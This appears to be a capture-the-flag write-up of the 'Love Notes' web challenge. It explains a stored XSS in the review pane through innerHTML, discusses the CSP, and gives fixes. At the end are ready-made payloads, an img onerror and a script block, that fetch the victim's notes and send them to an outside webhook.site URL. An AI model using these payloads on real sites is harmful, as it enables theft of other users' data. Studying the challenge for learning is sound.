# Love Notes

📝 Assessment Write-Up — “Lovely Notes” Application
1. Application Overview

The web application lets users sign up, log in and create personal notes. Users can view their own notes in a dashboard. Each note has a “report” button which, according to the challenge description, forwards the note to an admin or bot account for review.

2. Relevant Endpoints / Pages

/dashboard – main logged-in view of all notes.

/dashboard?reviewNote=<id> – displays a single note in a dedicated “review” pane.

/api/notes/ – returns JSON of all user notes.

/api/notes/:id – returns the content of a single note (as text).

/report – endpoint used by the “report” button to send noteId to the backend for review.

3. Client-Side Code Analysis

dashboard.js handles the bulk of the client-side logic:

It fetches notes from /api/notes/ and appends them to the DOM.

For each note, it creates:

<strong> for the title.

<p> for the content.

A “report” button which sends the note’s _id to /report.

Important lines:

strong.textContent = note.title
p.textContent = note.content


This ensures on the dashboard page itself the title and content are HTML-escaped — so arbitrary HTML in either field won’t execute there.

However, the reviewNote function does something different:

const note = await response.text();
showNoteDiv.innerHTML = `
    <h3>Note ID: ${reviewNoteId}</h3>
    <p>${note}</p>
`;


Here the app:

Fetches the note from /api/notes/:id as raw text.

Inserts it directly into the page via innerHTML inside a <p>.

This is a classic sink for stored XSS if the content returned by the server is unescaped HTML.

4. CSP Observations

The CSP restricts:

script-src https://inst-.../static/dashboard.js https://js.hcaptcha.com/1/api.js;
style-src https://inst-.../static/;
img-src 'none';
connect-src 'self';
...


This means:

You can’t load remote scripts from arbitrary domains.

You can use inline scripts only if there’s a nonce or 'unsafe-inline' (not present here).

connect-src 'self' means only AJAX calls to the same origin are allowed.

But XSS can still execute inline as long as it’s placed inside the page and doesn’t require external scripts, or uses allowed sources (e.g. the already loaded dashboard.js if abused).

5. Attack Surface

Dashboard list view: safe due to textContent.

Review note view: vulnerable, because of innerHTML with unsanitised note content.

This is likely the place where the admin bot “visits” when you press “report”.

6. Exploitation Path

Create a note with:

Title: harmless (e.g. “Test”).

Content: payload (e.g. <img src=x onerror=alert(1)> or any inline JS).

Click the “report” button to submit to /report.

Admin bot visits /dashboard?reviewNote=<id>.
Because the code does:

<p>${note}</p>


and ${note} is your raw note content, your payload executes in the admin/bot’s browser context.

7. Key Finding

The vulnerable point is not the note title — it’s the note content as returned by /api/notes/:id.

The code path that the admin bot follows renders that content via innerHTML, which allows arbitrary HTML/JS execution.

Therefore, payloads need to go into the content field for the admin bot to execute them.

8. Recommendations

Always HTML-encode user content server-side before returning it.

In the client, use textContent instead of innerHTML unless there’s a specific need for HTML.

CSP can be strengthened with script-src 'self' plus nonces to prevent inline JS execution.

TL;DR:
Title is safe on the dashboard, content is inserted unsanitised in the review pane.
For an XSS demonstration, inject payloads into the content field, then use the report feature to trigger the admin bot to load it.

<img src=x onerror="fetch('/api/notes').then(r=>r.text()).then(t=>fetch('https://webhook.site/dccfa4bf-e3ea-4c9c-890d-c92f235baa0c',{method:'POST',body:t}))">


?reviewNote=<ID>

<script>
  (async()=>{
    try{
      const t = await (await fetch('/api/notes')).text();
      navigator.sendBeacon('https://webhook.site/dccfa4bf-e3ea-4c9c-890d-c92f235baa0c', t);
    }catch(e){}
  })();
</script>

6fdfea4d-841d-425b-bc77-5adecdc1fcc8

<meta http-equiv="refresh" content="0;url=/api/notes/6fdfea4d-841d-425b-bc77-5adecdc1fcc8">


